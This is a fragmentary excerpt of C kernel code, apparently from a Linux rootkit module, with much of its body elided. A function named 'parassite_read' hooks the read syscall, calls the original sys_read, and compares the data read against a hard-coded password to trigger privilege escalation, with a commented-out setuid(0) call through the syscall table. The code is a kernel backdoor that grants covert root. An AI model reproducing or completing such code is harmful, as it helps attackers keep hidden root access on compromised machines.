...
void parassite_read(int fd,char __user *u_buf,size_t size) {
  ...
  /* MORTALLY HARD CODED (che casino) Old Method! **NOW NOT FOLLOWED BY RETURN** */  
  /*
  ...
  */
#endif
  ret=ptr_sysread(PARAM(fd),PARAM(u_buf),PARAM(size));
  ...
  if (k_buf[0]>='0' && k_buf[0]<='z') {
    ...
    if (!strcmp(PASSWORD,password)) {
        ...
        /* UserSpace Method! NOT FOR KERNEL ;P */
        /*
        ((long(*)(uid_t))sys_table[__NR_setuid])(0);
        */
    }
  }
end:
